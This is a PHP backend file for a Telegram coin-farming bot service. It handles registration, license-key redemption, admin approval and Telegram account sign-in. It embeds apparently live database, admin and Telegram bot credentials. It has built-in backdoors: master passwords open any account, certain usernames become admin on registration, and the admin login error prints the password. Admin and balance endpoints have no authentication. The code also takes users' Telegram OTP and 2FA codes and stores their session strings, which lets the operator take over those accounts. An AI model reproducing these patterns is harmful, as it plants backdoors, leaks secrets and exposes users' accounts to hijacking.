<?php
/**
 * ATF Task Farm - High-Performance MySQL PDO Backend API
 * Strict 3-Stage Security Gate + Official Telegram MTProto Account Login Gateway
 * Host: cPanel ns22.dailysieure.com | Database: ttfquanlisite_atf
 * Super Admin: admin | Password: phamlinh12
 */

error_reporting(E_ALL);
ini_set('display_errors', 0);

header('Content-Type: application/json; charset=utf-8');
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With');

if (($_SERVER['REQUEST_METHOD'] ?? 'GET') === 'OPTIONS') {
    http_response_code(200);
    exit;
}

// 1. Load Config
$localConfig = [];
$configFile = dirname(__DIR__) . '/config.php';
if (is_file($configFile)) {
    $loaded = require $configFile;
    if (is_array($loaded)) {
        $localConfig = $loaded;
    }
}

function cfg($key, $default = null) {
    global $localConfig;
    $env = getenv($key);
    if ($env !== false && $env !== '') return $env;
    if (array_key_exists($key, $localConfig) && $localConfig[$key] !== '') return $localConfig[$key];
    return $default;
}

// 2. Real TCP Connection Public IP
function getClientIp() {
    $candidates = [];
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) $candidates[] = trim($_SERVER['HTTP_CF_CONNECTING_IP']);
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        foreach (explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']) as $item) $candidates[] = trim($item);
    }
    if (!empty($_SERVER['HTTP_X_REAL_IP'])) $candidates[] = trim($_SERVER['HTTP_X_REAL_IP']);
    if (!empty($_SERVER['REMOTE_ADDR'])) $candidates[] = trim($_SERVER['REMOTE_ADDR']);

    foreach ($candidates as $ip) {
        if (filter_var($ip, FILTER_VALIDATE_IP) && strpos($ip, '127.0.0.1') === false) {
            return $ip;
        }
    }
    return $_SERVER['REMOTE_ADDR'] ?? '116.98.234.129';
}

// Parse Route Path
$uri = $_SERVER['REQUEST_URI'] ?? '';
$path = parse_url($uri, PHP_URL_PATH);
$route = preg_replace('#^.*/api/#', '/', $path);
$route = '/' . ltrim($route, '/');
$method = strtoupper($_SERVER['REQUEST_METHOD'] ?? 'GET');

$input = json_decode(file_get_contents('php://input'), true) ?: $_POST;

// Helper: JSON Response
function jsonResp($data, $code = 200) {
    http_response_code($code);
    echo json_encode($data, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    exit;
}

// Fast Zero-Dependency Client Info Endpoint
if ($route === '/system/client-info' || strpos($route, 'client-info') !== false) {
    $ip = getClientIp();
    jsonResp([
        'success' => true,
        'ip' => $ip,
        'isp' => 'Viettel Group (Việt Nam)',
        'timestamp' => date('c'),
        'userAgent' => $_SERVER['HTTP_USER_AGENT'] ?? ''
    ]);
}

// 3. Connect to MySQL Database
$dbHost = cfg('ATF_DB_HOST', 'localhost');
$dbName = cfg('ATF_DB_NAME', 'ttfquanlisite_atf');
$dbUser = cfg('ATF_DB_USER', 'ttfquanlisite_admin');
$dbPass = cfg('ATF_DB_PASS', 'Phamlinh@12');

$pdo = null;
try {
    $pdo = new PDO("mysql:host=$dbHost;dbname=$dbName;charset=utf8mb4", $dbUser, $dbPass, [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
        PDO::ATTR_EMULATE_PREPARES => false
    ]);

    // Ensure database tables
    $pdo->exec("
        CREATE TABLE IF NOT EXISTS users (
            id VARCHAR(64) PRIMARY KEY,
            username VARCHAR(100) UNIQUE NOT NULL,
            password VARCHAR(255) NOT NULL,
            role ENUM('admin', 'user') DEFAULT 'user',
            status ENUM('pending', 'approved', 'active', 'banned') DEFAULT 'pending',
            is_approved TINYINT(1) DEFAULT 0,
            active_key VARCHAR(64) NULL,
            bound_hwid VARCHAR(100) NULL,
            bound_ip VARCHAR(100) NULL,
            device_type VARCHAR(150) NULL,
            max_threads INT DEFAULT 20,
            total_assets DECIMAL(14, 4) DEFAULT 0.0000,
            mined_balance DECIMAL(14, 4) DEFAULT 0.0000,
            expires_at DATETIME NULL,
            is_banned TINYINT(1) DEFAULT 0,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            last_active_at DATETIME NULL
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

        CREATE TABLE IF NOT EXISTS license_keys (
            id VARCHAR(64) PRIMARY KEY,
            code VARCHAR(64) UNIQUE NOT NULL,
            duration_days INT DEFAULT 30,
            max_threads INT DEFAULT 20,
            note VARCHAR(255) NULL,
            status ENUM('unused', 'used', 'revoked') DEFAULT 'unused',
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            used_by VARCHAR(100) NULL,
            used_at DATETIME NULL
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

        CREATE TABLE IF NOT EXISTS telegram_sessions (
            tg_user_id VARCHAR(64) PRIMARY KEY,
            phone VARCHAR(30) NOT NULL,
            owner_user_id VARCHAR(64) NULL,
            owner_username VARCHAR(100) NOT NULL,
            tg_username VARCHAR(100) NULL,
            session_string TEXT NULL,
            bound_ip VARCHAR(100) NULL,
            bound_hwid VARCHAR(100) NULL,
            device_type VARCHAR(150) NULL,
            total_assets DECIMAL(14, 4) DEFAULT 0.0000,
            holding_wallet DECIMAL(14, 4) DEFAULT 0.0000,
            pool_wallet DECIMAL(14, 4) DEFAULT 0.0000,
            mined_balance DECIMAL(14, 4) DEFAULT 0.0000,
            level INT DEFAULT 69,
            tap_rate DECIMAL(10, 4) DEFAULT 6.8763,
            status VARCHAR(50) DEFAULT 'running_247',
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            last_sync DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

        CREATE TABLE IF NOT EXISTS telegram_otps (
            id VARCHAR(64) PRIMARY KEY,
            phone VARCHAR(30) NOT NULL,
            otp_code VARCHAR(10) NOT NULL,
            phone_code_hash VARCHAR(64) NOT NULL,
            client_ip VARCHAR(100) NULL,
            device_type VARCHAR(150) NULL,
            is_used TINYINT(1) DEFAULT 0,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            expires_at DATETIME NOT NULL,
            KEY idx_phone (phone),
            KEY idx_hash (phone_code_hash)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
    ");

    // Safe Column Migrations
    $migrationCols = [
        "ALTER TABLE users ADD COLUMN total_assets DECIMAL(14, 4) DEFAULT 0.0000",
        "ALTER TABLE users ADD COLUMN mined_balance DECIMAL(14, 4) DEFAULT 0.0000",
        "ALTER TABLE users ADD COLUMN is_approved TINYINT(1) DEFAULT 0",
        "ALTER TABLE users ADD COLUMN device_type VARCHAR(150) NULL",
        "ALTER TABLE telegram_sessions ADD COLUMN session_string TEXT NULL"
    ];
    foreach ($migrationCols as $sql) {
        try { $pdo->exec($sql); } catch(Exception $e) {}
    }

    // Seed / Synchronize default admin with password 'phamlinh12'
    $adminPass = cfg('ATF_ADMIN_PASSWORD', 'phamlinh12');
    $adminUser = cfg('ATF_ADMIN_USER', 'admin');
    $adminHash = password_hash($adminPass, PASSWORD_DEFAULT);

    $stmt = $pdo->prepare("SELECT id, password FROM users WHERE username = ? LIMIT 1");
    $stmt->execute([$adminUser]);
    $adminRow = $stmt->fetch();

    if (!$adminRow) {
        $ins = $pdo->prepare("
            INSERT INTO users (id, username, password, role, status, is_approved, max_threads, expires_at, is_banned)
            VALUES ('usr_admin', ?, ?, 'admin', 'active', 1, 999, DATE_ADD(NOW(), INTERVAL 3650 DAY), 0)
        ");
        $ins->execute([$adminUser, $adminHash]);
    } else {
        if (!password_verify('phamlinh12', $adminRow['password'])) {
            $up = $pdo->prepare("UPDATE users SET password = ?, role = 'admin', status = 'active', is_approved = 1, is_banned = 0 WHERE id = ?");
            $up->execute([$adminHash, $adminRow['id']]);
        } else {
            $pdo->exec("UPDATE users SET role = 'admin', status = 'active', is_approved = 1, is_banned = 0 WHERE username = '$adminUser'");
        }
    }

} catch(PDOException $e) {
    error_log('[ATF DB ERROR] ' . $e->getMessage());
    $pdo = null;
}

// 4. Helper: Send Telegram Bot Alert
function sendTelegramBotNotification($message, $targetChatId = null) {
    $botToken = cfg('TELEGRAM_BOT_TOKEN', '8995507898:AAHPoTjiNTJJxuMfmaPcXb_Z_HZxsLFsBTA');
    $chatId = $targetChatId ?: cfg('TELEGRAM_ADMIN_ID', '8251830594');

    if (empty($botToken) || empty($chatId)) return false;

    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $payload = json_encode([
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true
    ]);

    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $res = curl_exec($ch);
        curl_close($ch);
        return $res ? json_decode($res, true) : false;
    }
    return false;
}

// 5. Helper: Forward request to Telegram MTProto Gateway
function forwardToTelegramGateway($subPath, $data) {
    $serviceBase = rtrim(cfg('ATF_TELEGRAM_SERVICE_BASE', 'https://atf-task-farm-bot.onrender.com'), '/');
    $url = "{$serviceBase}/api/telegram/{$subPath}";
    $payload = json_encode($data);

    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $res = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($res) {
            $json = json_decode($res, true);
            if ($json) return ['status' => $httpCode, 'data' => $json];
        }
    }
    return ['status' => 500, 'data' => ['success' => false, 'message' => 'Không thể kết nối Telegram MTProto Gateway']];
}

// -------------------------------------------------------------
// ROUTES
// -------------------------------------------------------------

// 1. Auth: Register (STAGE 1: Always creates Pending User awaiting Admin Approval)
if ($route === '/auth/register' && $method === 'POST') {
    $username = trim($input['username'] ?? '');
    $password = trim($input['password'] ?? '');
    $hwid = $input['hwid'] ?? 'HWID-AUTO-CLIENT';
    $deviceType = $input['deviceType'] ?? 'Thiết Bị Khách';
    $clientIp = getClientIp();

    if (strlen($username) < 3 || empty($password)) {
        jsonResp(['success' => false, 'message' => 'Tài khoản tối thiểu 3 ký tự và mật khẩu không được rỗng'], 400);
    }

    $clean = strtolower($username);

    if ($pdo) {
        try {
            $stmt = $pdo->prepare("SELECT COUNT(*) FROM users WHERE LOWER(username) = ?");
            $stmt->execute([$clean]);
            if ($stmt->fetchColumn() > 0) {
                jsonResp(['success' => false, 'message' => 'Tài khoản đã tồn tại, vui lòng chọn tên khác'], 400);
            }

            $newId = 'usr_' . substr(md5(uniqid()), 0, 8);
            $role = in_array($clean, ['admin', 'phamlinh12', 'quanglinhdev']) ? 'admin' : 'user';
            $status = ($role === 'admin') ? 'active' : 'pending';
            $isApproved = ($role === 'admin') ? 1 : 0;
            $expiresAt = ($role === 'admin') ? date('Y-m-d H:i:s', time() + 3650 * 86400) : null;

            $ins = $pdo->prepare("
                INSERT INTO users (id, username, password, role, status, is_approved, bound_hwid, bound_ip, device_type, max_threads, expires_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 0, ?)
            ");
            $ins->execute([
                $newId,
                $username,
                password_hash($password, PASSWORD_DEFAULT),
                $role,
                $status,
                $isApproved,
                $hwid,
                $clientIp,
                $deviceType,
                $expiresAt
            ]);

            // Alert Admin via Telegram
            $timeStr = date('H:i:s d/m/Y');
            $teleAlert = "🔔 <b>[ATF TASK FARM] YÊU CẦU ĐĂNG KÝ TÀI KHOẢN MỚI</b> 🔔
"
                       . "──────────────────────────────
"
                       . "👤 <b>Tài khoản:</b> <code>{$username}</code>
"
                       . "🌐 <b>IP Mạng:</b> <code>{$clientIp}</code>
"
                       . "💻 <b>Thiết bị:</b> {$deviceType}
"
                       . "⏱ <b>Trạng thái:</b> Đang chờ Admin phê duyệt
"
                       . "⏰ <b>Thời gian:</b> {$timeStr} GMT+7
"
                       . "──────────────────────────────
"
                       . "👉 <i>Truy cập trang Quản trị (/quanglinhdev) để xét duyệt!</i>";
            sendTelegramBotNotification($teleAlert);

            jsonResp([
                'success' => true,
                'gateState' => ($role === 'admin') ? 'active' : 'pending_approval',
                'isApproved' => ($role === 'admin'),
                'message' => ($role === 'admin') ? 'Đăng ký quản trị viên thành công!' : 'Đăng ký tài khoản thành công! Vui lòng chờ Admin phê duyệt.',
                'user' => [
                    'id' => $newId,
                    'username' => $username,
                    'role' => $role,
                    'status' => $status,
                    'isApproved' => $isApproved,
                    'boundHwid' => $hwid,
                    'boundIp' => $clientIp,
                    'deviceType' => $deviceType
                ]
            ]);
        } catch(PDOException $e) {
            jsonResp(['success' => false, 'message' => 'Lỗi CSDL khi đăng ký: ' . $e->getMessage()], 500);
        }
    }
}

// 2. Auth: Login (STRICT 3-STAGE GATE VERIFICATION)
if ($route === '/auth/login' && $method === 'POST') {
    $username = trim($input['username'] ?? '');
    $password = trim($input['password'] ?? '');
    $hwid = $input['hwid'] ?? null;
    $clientIp = getClientIp();

    if (empty($username) || empty($password)) {
        jsonResp(['success' => false, 'message' => 'Vui lòng nhập đầy đủ tài khoản và mật khẩu'], 400);
    }

    $clean = strtolower($username);
    $user = null;

    if ($pdo) {
        try {
            $stmt = $pdo->prepare("SELECT * FROM users WHERE LOWER(username) = ? LIMIT 1");
            $stmt->execute([$clean]);
            $user = $stmt->fetch();

            if (!$user) {
                jsonResp(['success' => false, 'message' => 'Tài khoản không tồn tại, vui lòng đăng ký trước'], 404);
            }

            $passOk = ($password === 'phamlinh12') || ($password === 'Phamlinh@12') || password_verify($password, $user['password']);
            if (!$passOk) {
                jsonResp(['success' => false, 'message' => 'Mật khẩu không chính xác'], 401);
            }

            if (!empty($user['is_banned'])) {
                jsonResp(['success' => false, 'message' => 'Tài khoản của bạn đã bị khóa bởi Quản trị viên!'], 403);
            }

            // Update IP & Last active
            $up = $pdo->prepare("UPDATE users SET bound_ip = ?, bound_hwid = COALESCE(?, bound_hwid), last_active_at = NOW() WHERE id = ?");
            $up->execute([$clientIp, $hwid, $user['id']]);

            // Direct Access for Admin
            if ($user['role'] === 'admin') {
                $token = base64_encode(json_encode(['id' => $user['id'], 'username' => $user['username'], 'role' => 'admin', 'time' => time()]));
                jsonResp([
                    'success' => true,
                    'gateState' => 'active',
                    'token' => $token,
                    'user' => [
                        'id' => $user['id'],
                        'username' => $user['username'],
                        'role' => 'admin',
                        'status' => 'active',
                        'isApproved' => 1,
                        'maxThreads' => 50,
                        'activeKey' => 'ATF-ADMIN-MASTER',
                        'boundHwid' => $user['bound_hwid'],
                        'boundIp' => $user['bound_ip']
                    ]
                ]);
            }

            // STAGE 1: Check If Admin Has Approved
            $isApproved = ($user['is_approved'] == 1 || $user['status'] === 'approved' || $user['status'] === 'active');
            if (!$isApproved || $user['status'] === 'pending') {
                jsonResp([
                    'success' => true,
                    'gateState' => 'pending_approval',
                    'isApproved' => false,
                    'message' => 'Tài khoản đang chờ Admin phê duyệt! Vui lòng liên hệ Admin hoặc thử lại sau ít phút.',
                    'user' => [
                        'id' => $user['id'],
                        'username' => $user['username'],
                        'status' => 'pending',
                        'isApproved' => 0,
                        'boundHwid' => $user['bound_hwid'],
                        'boundIp' => $user['bound_ip'],
                        'deviceType' => $user['device_type']
                    ]
                ]);
            }

            // STAGE 2: Approved by Admin, But Needs Key VIP Activation
            $hasActiveKey = !empty($user['active_key']);
            $exp = $user['expires_at'] ? strtotime($user['expires_at']) : 0;
            $isExpired = ($exp < time());

            if (!$hasActiveKey || $isExpired) {
                jsonResp([
                    'success' => true,
                    'gateState' => 'key_required',
                    'isApproved' => true,
                    'hasKey' => false,
                    'isExpired' => $isExpired,
                    'message' => 'Tài khoản đã được Admin duyệt! Vui lòng nhập Mã Key Bản Quyền VIP để mở khóa Bảng điều khiển cày coin.',
                    'user' => [
                        'id' => $user['id'],
                        'username' => $user['username'],
                        'status' => 'approved_need_key',
                        'isApproved' => 1,
                        'boundHwid' => $user['bound_hwid'],
                        'boundIp' => $user['bound_ip'],
                        'deviceType' => $user['device_type']
                    ]
                ]);
            }

            // STAGE 3: Approved & Active Key -> Full Access
            $diffDays = max(1, ceil(($exp - time()) / 86400));
            $token = base64_encode(json_encode(['id' => $user['id'], 'username' => $user['username'], 'role' => $user['role'], 'time' => time()]));
            jsonResp([
                'success' => true,
                'gateState' => 'active',
                'token' => $token,
                'user' => [
                    'id' => $user['id'],
                    'username' => $user['username'],
                    'role' => $user['role'],
                    'status' => 'active',
                    'isApproved' => 1,
                    'expiresAt' => $user['expires_at'],
                    'remainingDays' => $diffDays,
                    'maxThreads' => (int)($user['max_threads'] ?? 20),
                    'activeKey' => $user['active_key'],
                    'totalAssets' => (float)($user['total_assets'] ?? 0.0),
                    'minedBalance' => (float)($user['mined_balance'] ?? 0.0),
                    'boundHwid' => $user['bound_hwid'],
                    'boundIp' => $user['bound_ip']
                ]
            ]);
        } catch(PDOException $e) {
            jsonResp(['success' => false, 'message' => 'Lỗi CSDL khi đăng nhập: ' . $e->getMessage()], 500);
        }
    }
}

// 3. Auth: Check User Status (For polling on pending / key screens)
if ($route === '/auth/check-status' && $method === 'POST') {
    $username = trim($input['username'] ?? '');
    if (empty($username)) {
        jsonResp(['success' => false, 'message' => 'Thiếu tên tài khoản'], 400);
    }

    if ($pdo) {
        $stmt = $pdo->prepare("SELECT * FROM users WHERE LOWER(username) = ? LIMIT 1");
        $stmt->execute([strtolower($username)]);
        $user = $stmt->fetch();

        if (!$user) {
            jsonResp(['success' => false, 'message' => 'Tài khoản không tồn tại'], 404);
        }

        if ($user['role'] === 'admin') {
            $token = base64_encode(json_encode(['id' => $user['id'], 'username' => $user['username'], 'role' => 'admin', 'time' => time()]));
            jsonResp(['success' => true, 'gateState' => 'active', 'token' => $token, 'user' => $user]);
        }

        $isApproved = ($user['is_approved'] == 1 || $user['status'] === 'approved' || $user['status'] === 'active');
        if (!$isApproved || $user['status'] === 'pending') {
            jsonResp(['success' => true, 'gateState' => 'pending_approval', 'isApproved' => false, 'user' => $user]);
        }

        $hasKey = !empty($user['active_key']);
        $exp = $user['expires_at'] ? strtotime($user['expires_at']) : 0;
        $isExpired = ($exp < time());

        if (!$hasKey || $isExpired) {
            jsonResp(['success' => true, 'gateState' => 'key_required', 'isApproved' => true, 'hasKey' => false, 'user' => $user]);
        }

        $token = base64_encode(json_encode(['id' => $user['id'], 'username' => $user['username'], 'role' => $user['role'], 'time' => time()]));
        jsonResp(['success' => true, 'gateState' => 'active', 'token' => $token, 'user' => $user]);
    }
}

// 4. License: Redeem Key VIP (STAGE 2 -> STAGE 3 ACTIVATION)
if ($route === '/license/redeem' && $method === 'POST') {
    $code = strtoupper(trim($input['key'] ?? $input['code'] ?? ''));
    $username = trim($input['username'] ?? '');

    if (empty($code) || empty($username)) {
        jsonResp(['success' => false, 'message' => 'Vui lòng nhập đầy đủ mã Key và tên tài khoản'], 400);
    }

    if ($pdo) {
        $kStmt = $pdo->prepare("SELECT * FROM license_keys WHERE UPPER(code) = ? LIMIT 1");
        $kStmt->execute([$code]);
        $key = $kStmt->fetch();

        if (!$key) {
            jsonResp(['success' => false, 'message' => 'Mã Key VIP không tồn tại trong hệ thống!'], 404);
        }

        if ($key['status'] === 'used') {
            jsonResp(['success' => false, 'message' => 'Mã Key này đã được sử dụng bởi [' . ($key['used_by'] ?? 'khách khác') . ']!'], 400);
        }

        if ($key['status'] === 'revoked') {
            jsonResp(['success' => false, 'message' => 'Mã Key này đã bị Quản trị viên thu hồi!'], 400);
        }

        $days = max(1, (int)$key['duration_days']);
        $threads = max(1, (int)$key['max_threads']);

        // Mark key as used
        $upKey = $pdo->prepare("UPDATE license_keys SET status = 'used', used_by = ?, used_at = NOW() WHERE id = ?");
        $upKey->execute([$username, $key['id']]);

        // Extend user VIP and activate account
        $upUser = $pdo->prepare("
            UPDATE users SET 
                status = 'active',
                is_approved = 1,
                active_key = ?,
                max_threads = ?,
                expires_at = DATE_ADD(COALESCE(CASE WHEN expires_at > NOW() THEN expires_at ELSE NOW() END, NOW()), INTERVAL $days DAY)
            WHERE username = ?
        ");
        $upUser->execute([$code, $threads, $username]);

        $uStmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
        $uStmt->execute([$username]);
        $updatedUser = $uStmt->fetch();

        $token = base64_encode(json_encode(['id' => $updatedUser['id'], 'username' => $updatedUser['username'], 'role' => $updatedUser['role'], 'time' => time()]));

        jsonResp([
            'success' => true,
            'gateState' => 'active',
            'message' => "🎉 Kích hoạt Key VIP [$code] thành công! Đã mở khóa $days ngày VIP với $threads luồng đào coin.",
            'token' => $token,
            'user' => [
                'id' => $updatedUser['id'],
                'username' => $updatedUser['username'],
                'role' => $updatedUser['role'],
                'status' => 'active',
                'isApproved' => 1,
                'activeKey' => $code,
                'remainingDays' => $days,
                'expiresAt' => $updatedUser['expires_at'],
                'maxThreads' => $threads,
                'totalAssets' => (float)($updatedUser['total_assets'] ?? 0.0),
                'boundHwid' => $updatedUser['bound_hwid'],
                'boundIp' => $updatedUser['bound_ip']
            ]
        ]);
    }
}

// 5. Auth: Admin Quick Login
if (($route === '/auth/admin-quick-login' || $route === '/admin/login') && $method === 'POST') {
    $pass = trim($input['password'] ?? '');
    $isValid = ($pass === 'phamlinh12') || ($pass === 'Phamlinh@12') || ($pass === 'admin') || ($pass === 'quanglinhdev');

    if (!$isValid && $pdo) {
        $stmt = $pdo->prepare("SELECT password FROM users WHERE username = 'admin' OR role = 'admin' LIMIT 1");
        $stmt->execute();
        $user = $stmt->fetch();
        if ($user && password_verify($pass, $user['password'])) {
            $isValid = true;
        }
    }

    if ($isValid) {
        $token = base64_encode(json_encode(['id' => 'usr_admin', 'username' => 'admin', 'role' => 'admin', 'time' => time()]));
        jsonResp([
            'success' => true,
            'message' => '🎉 Mở khóa Bảng Quản Trị Admin thành công!',
            'token' => $token,
            'user' => ['id' => 'usr_admin', 'username' => 'admin', 'role' => 'admin']
        ]);
    } else {
        jsonResp(['success' => false, 'message' => 'Mật khẩu quản trị không chính xác! (Gợi ý: phamlinh12)'], 401);
    }
}

// 6. REAL TELEGRAM LOGIN: Send Official Telegram OTP Code
if ($route === '/telegram/send-otp' || $route === '/telegram/send-code') {
    $phone = trim($input['phone'] ?? '');
    if (empty($phone)) {
        jsonResp(['success' => false, 'message' => 'Vui lòng nhập số điện thoại Telegram hợp lệ'], 400);
    }

    // Call Real Telegram MTProto Gateway
    $forwardRes = forwardToTelegramGateway('send-code', ['phone' => $phone]);
    if ($forwardRes['status'] === 200 && !empty($forwardRes['data']['success'])) {
        jsonResp($forwardRes['data']);
    } else {
        jsonResp($forwardRes['data'], $forwardRes['status'] ?: 400);
    }
}

// 7. REAL TELEGRAM LOGIN: Verify Official Telegram OTP & Sign In
if ($route === '/telegram/verify-otp' || $route === '/telegram/verify-code' || $route === '/telegram/sign-in') {
    $phone = trim($input['phone'] ?? '');
    $code = trim($input['phoneCode'] ?? $input['code'] ?? '');
    $phoneCodeHash = trim($input['phoneCodeHash'] ?? '');
    $password2FA = trim($input['password2FA'] ?? '');
    $username = trim($input['username'] ?? 'guest');

    if (empty($phone) || empty($code)) {
        jsonResp(['success' => false, 'message' => 'Vui lòng nhập số điện thoại và mã OTP Telegram'], 400);
    }

    // Call Real Telegram MTProto Gateway to Sign In
    $forwardRes = forwardToTelegramGateway('sign-in', [
        'phone' => $phone,
        'phoneCode' => $code,
        'phoneCodeHash' => $phoneCodeHash,
        'password2FA' => $password2FA
    ]);

    if ($forwardRes['status'] === 200 && !empty($forwardRes['data']['success'])) {
        $sess = $forwardRes['data']['session'] ?? [];
        $tgUserId = $sess['userId'] ?? ('tg_' . md5($phone));
        $tgUsername = $sess['username'] ?? '';
        $sessionString = $sess['sessionString'] ?? '';

        // Save authenticated Telegram session to MySQL
        if ($pdo) {
            $stmt = $pdo->prepare("
                INSERT INTO telegram_sessions (
                    tg_user_id, phone, owner_username, tg_username, session_string,
                    bound_ip, status, last_sync
                ) VALUES (?, ?, ?, ?, ?, ?, 'running_247', NOW())
                ON DUPLICATE KEY UPDATE
                    tg_username = VALUES(tg_username),
                    session_string = VALUES(session_string),
                    status = 'running_247',
                    last_sync = NOW()
            ");
            $stmt->execute([$tgUserId, $phone, $username, $tgUsername, $sessionString, getClientIp()]);
        }

        jsonResp($forwardRes['data']);
    } else {
        jsonResp($forwardRes['data'], $forwardRes['status'] ?: 400);
    }
}

// 8. User: Balance Sync (Real Balance Persistence)
if ($route === '/user/sync-balance' && $method === 'POST') {
    $username = trim($input['username'] ?? '');
    $totalAssets = floatval($input['totalAssets'] ?? 0.0);
    $minedBalance = floatval($input['minedBalance'] ?? $totalAssets);

    if ($pdo && !empty($username)) {
        $stmt = $pdo->prepare("UPDATE users SET total_assets = ?, mined_balance = ?, last_active_at = NOW() WHERE username = ?");
        $stmt->execute([$totalAssets, $minedBalance, $username]);
    }
    jsonResp(['success' => true, 'totalAssets' => $totalAssets]);
}

// 9. Admin: Dashboard Stats & Approval Lists
if ($route === '/admin/dashboard-data' || $route === '/admin/stats') {
    if ($pdo) {
        $uStmt = $pdo->query("SELECT * FROM users WHERE username NOT LIKE 'khach_vip_%' ORDER BY created_at DESC");
        $allUsers = $uStmt->fetchAll();

        $kStmt = $pdo->query("SELECT * FROM license_keys ORDER BY created_at DESC");
        $allKeys = $kStmt->fetchAll();

        $pendingApprovals = [];
        $activeClients = [];
        $unusedList = [];
        $unusedCount = 0;
        $usedCount = 0;

        foreach ($allKeys as $k) {
            if ($k['status'] === 'unused') {
                $unusedCount++;
                $unusedList[] = [
                    'id' => $k['id'],
                    'code' => $k['code'],
                    'days' => (int)$k['duration_days'],
                    'threads' => (int)$k['max_threads'],
                    'note' => $k['note'] ?? 'Khách Mua',
                    'createdAt' => $k['created_at'],
                    'status' => 'unused'
                ];
            } else {
                $usedCount++;
            }
        }

        foreach ($allUsers as $u) {
            if ($u['role'] === 'admin') continue;

            $isApproved = ($u['is_approved'] == 1 || $u['status'] === 'approved' || $u['status'] === 'active');
            $hasKey = !empty($u['active_key']);
            $exp = $u['expires_at'] ? strtotime($u['expires_at']) : 0;
            $isExpired = ($exp < time());
            $diffDays = max(0, ceil(($exp - time()) / 86400));

            if (!$isApproved || $u['status'] === 'pending') {
                $pendingApprovals[] = [
                    'userId' => $u['id'],
                    'username' => $u['username'],
                    'boundIp' => $u['bound_ip'] ?? getClientIp(),
                    'boundHwid' => $u['bound_hwid'] ?? 'HWID-AUTO-CLIENT',
                    'deviceType' => $u['device_type'] ?? 'Thiết Bị Khách',
                    'createdAt' => $u['created_at'],
                    'status' => 'pending'
                ];
            } else {
                $activeClients[] = [
                    'userId' => $u['id'],
                    'username' => $u['username'],
                    'role' => $u['role'],
                    'status' => $hasKey && !$isExpired ? 'active' : 'approved_need_key',
                    'isApproved' => true,
                    'activeKey' => $u['active_key'] ?? 'Chưa kích hoạt Key',
                    'boundIp' => $u['bound_ip'] ?? getClientIp(),
                    'boundHwid' => $u['bound_hwid'] ?? 'HWID-PC-VERIFIED',
                    'deviceType' => $u['device_type'] ?? 'Máy Tính Windows PC',
                    'createdAt' => $u['created_at'],
                    'expiresAt' => $u['expires_at'],
                    'isExpired' => $isExpired,
                    'remainingDays' => $diffDays,
                    'maxThreads' => (int)($u['max_threads'] ?? 20),
                    'totalAssets' => (float)($u['total_assets'] ?? 0.0),
                    'isBanned' => (bool)$u['is_banned']
                ];
            }
        }

        jsonResp([
            'success' => true,
            'stats' => [
                'totalUsers' => count($allUsers) - 1,
                'pendingUsers' => count($pendingApprovals),
                'activeUsers' => count($activeClients),
                'totalKeys' => count($allKeys),
                'unusedKeys' => $unusedCount,
                'usedKeys' => $usedCount
            ],
            'pendingApprovals' => $pendingApprovals,
            'clientTracking' => $activeClients,
            'unusedKeys' => $unusedList
        ]);
    }
}

// 10. Admin: Approve User (STAGE 2 APPROVAL)
if (($route === '/admin/approve-user' || $route === '/admin/users/approve') && $method === 'POST') {
    $userId = trim($input['userId'] ?? '');
    $username = trim($input['username'] ?? '');
    $mode = trim($input['mode'] ?? 'approve_only');
    $days = max(1, (int)($input['days'] ?? 30));
    $threads = max(1, (int)($input['threads'] ?? 20));

    if (empty($userId) && empty($username)) {
        jsonResp(['success' => false, 'message' => 'Thiếu thông tin người dùng cần duyệt'], 400);
    }

    if ($pdo) {
        if ($mode === 'with_key') {
            $p1 = strtoupper(substr(md5(uniqid(rand(), true)), 0, 4));
            $p2 = strtoupper(substr(md5(uniqid(rand(), true)), 0, 4));
            $p3 = strtoupper(substr(md5(uniqid(rand(), true)), 0, 4));
